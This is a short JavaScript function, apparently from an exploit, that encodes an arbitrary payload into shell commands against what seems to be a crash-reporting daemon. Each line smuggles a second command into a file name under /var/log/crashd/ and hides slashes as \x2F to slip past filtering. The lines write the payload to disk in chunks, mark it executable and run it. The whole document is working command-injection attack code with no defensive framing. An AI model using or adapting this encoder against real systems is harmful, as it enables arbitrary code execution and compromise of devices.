    function crashd_encode(str, out_file, chunk_len) {
        const prefix = 'touch /var/log/crashd/"x;';
        const suffix = '"\n';
        const escaped_out_file = '\\$(echo -en \'' + out_file.replaceAll('/', '\\x2F') + '\')';
        let out_str = '';
        for (let i = 0; i < str.length; i += chunk_len) {
            out_str += prefix + 'echo -en \'' + str.substring(i, i + chunk_len).replaceAll('/', '\\x2F') + (i == 0 ? '\'>' : '\'>>') + escaped_out_file + suffix;
        }
        out_str += prefix + 'chmod 755 ' + escaped_out_file + suffix;
        out_str += prefix + escaped_out_file + suffix;
        return out_str;
    }
